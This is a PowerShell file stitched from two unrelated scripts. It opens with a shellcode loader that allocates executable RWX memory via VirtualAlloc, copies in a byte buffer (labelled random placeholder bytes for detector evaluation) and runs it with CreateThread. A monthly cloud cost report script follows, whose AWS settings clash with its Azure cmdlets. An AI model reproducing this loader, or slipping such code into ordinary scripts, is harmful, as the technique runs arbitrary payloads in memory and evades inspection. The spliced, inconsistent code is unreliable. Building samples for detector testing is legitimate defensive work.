
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xa6, 0x61, 0x08, 0x79, 0xca, 0x85, 0x01, 0x43, 0x84, 0xdb, 0x2c, 0x5e, 0x1b, 0x4d, 0x4c, 0x7f,
        0xeb, 0x22, 0xe2, 0xd3, 0x3c, 0xea, 0xf9, 0x02, 0x29, 0xe1, 0x03, 0xc4, 0x60, 0x62, 0xc9, 0xe1,
        0x00, 0x5c, 0xc7, 0x1f, 0x5e, 0xcd, 0xfd, 0x04, 0x6a, 0xa8, 0xb5, 0x11, 0x04, 0x88, 0xbe, 0xe1,
        0x7a, 0x33, 0x86, 0x8a, 0x01, 0xd1, 0x47, 0x30, 0xee, 0x81, 0x08, 0xf4, 0x04, 0x54, 0x6a, 0x2f,
        0xb1, 0xe8, 0x27, 0x06, 0xbe, 0xb4, 0x0c, 0xd4, 0xaa, 0x90, 0xab, 0x4a, 0xeb, 0x90, 0x01, 0x05,
        0x9b, 0x94, 0x65, 0xbc, 0x43, 0x41, 0xd1, 0x9b, 0xca, 0xcf, 0x26, 0x5c, 0x90, 0x14, 0x76, 0x37,
        0x1f, 0xbd, 0xb2, 0x64, 0x20, 0x92, 0x71, 0x94, 0xe9, 0xfc, 0x9b, 0x1b, 0x66, 0xeb, 0x60, 0xa5,
        0xde, 0x9d, 0xe1, 0xc1, 0x1f, 0xae, 0xa0, 0x63, 0x44, 0x2c, 0x87, 0x9d, 0x95, 0xd9, 0x1a, 0xab,
        0x64, 0xdf, 0x6d, 0xd7, 0x2d, 0x0e, 0x82, 0xcc, 0xf6, 0x34, 0xae, 0xc5, 0x9f, 0x02, 0xdd, 0x48,
        0x94, 0xa9, 0x61, 0xd7, 0xd9, 0x3b, 0xd7, 0xa7, 0xf2, 0x8c, 0x0e, 0x3e, 0x66, 0x49, 0x5c, 0x37,
        0xa0, 0x02, 0xaf, 0x6e, 0x55, 0x82, 0x18, 0xa8, 0x21, 0x59, 0x68, 0xcd, 0xcd, 0xc9, 0xc7, 0xc5,
        0x3f, 0x05, 0x98, 0x13, 0x18, 0x23, 0x86, 0x16, 0xe8, 0xc6, 0xa9, 0xb3, 0x9d, 0xf5, 0xb5, 0x12,
        0xab, 0x19, 0x4d, 0x14, 0xb3, 0xe3, 0x62, 0x49, 0x09, 0x49, 0xba, 0x12, 0x70, 0xe1, 0x66, 0x98,
        0x1f, 0x37, 0x5f, 0x7c, 0x84, 0x18, 0x79, 0x17, 0x51, 0x4d, 0x62, 0x5d, 0x16, 0x23, 0x68, 0x44,
        0xbf, 0x9f, 0x3f, 0x94, 0xbf, 0x0d, 0xf9, 0xa3, 0xb9, 0x0b, 0x0b, 0x33, 0xb1, 0xad, 0x78, 0x92,
        0x5d, 0x80, 0xe0, 0x72, 0x1f, 0x82, 0xde, 0x06, 0xfc, 0x3f, 0x84, 0x45, 0x67, 0x97, 0x2a, 0x25,
        0xef, 0xb1, 0x1f, 0x75, 0xbd, 0xb2, 0x15, 0xfd, 0xf9, 0x33, 0x8b, 0xea, 0x28, 0xaa, 0xac, 0xff,
        0x42, 0x5b, 0xfd, 0xcb, 0xdc, 0xe5, 0x9d, 0x9a, 0x1d, 0x97, 0x77, 0xaa, 0x63, 0x05, 0xf4, 0x6c,
        0xfa, 0xb2, 0xcd, 0xb8, 0xd4, 0xcc, 0x9a, 0x72, 0xf6, 0x8c, 0x63, 0x53, 0x5d, 0x76, 0xdf, 0xaa,
        0xf9, 0x86, 0x8e, 0xf1, 0x10, 0xd3, 0xa5, 0x28, 0x4a, 0x35, 0x77, 0x7a, 0xf7, 0x6d, 0x51, 0xc0,
        0x36, 0x41, 0x97, 0x10, 0xb2, 0xb6, 0xbe, 0x9d
    )

    $MemoryHandle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 3671)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Builds a monthly cloud cost report per service and flags overspend.
.DESCRIPTION
    Queries the cost API of the selected provider, groups the spend per service
    and writes a CSV plus a JSON summary.
    When the monthly total passes the threshold the script emits a warning that
    can be picked up by the monitoring pipeline.
.PARAMETER Threshold
    Used when the script runs unattended.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [double]$Threshold = 2500,
    [string]$Region = "us-east-1",
    [string]$ProfileName = 'adatum-billing',
    [Parameter(Mandatory = $false)]
    [string]$Month = "2025-04",

    [string]$Account = '441980746795',

    [string]$ReportPath = "D:\Ops\finops\cost-azure-2025-04.csv",
    [string]$OutputPath = "D:\Ops\finops\cost-azure-2025-04.json"
)
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$usage = Get-AzConsumptionUsageDetail -StartDate $start -EndDate $end -ErrorAction Stop
$groups = foreach ($line in $usage) {
    [pscustomobject]@{
        Period  = $line.UsageStart.ToString('yyyy-MM-dd')
        Service = $line.ServiceName
        Amount  = [math]::Round([double]$line.PretaxCost, 2)
        Unit    = $line.Currency
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan

$byService | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$topServices = $byService | Select-Object -First 5
$topServices | Format-Table -AutoSize
if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}
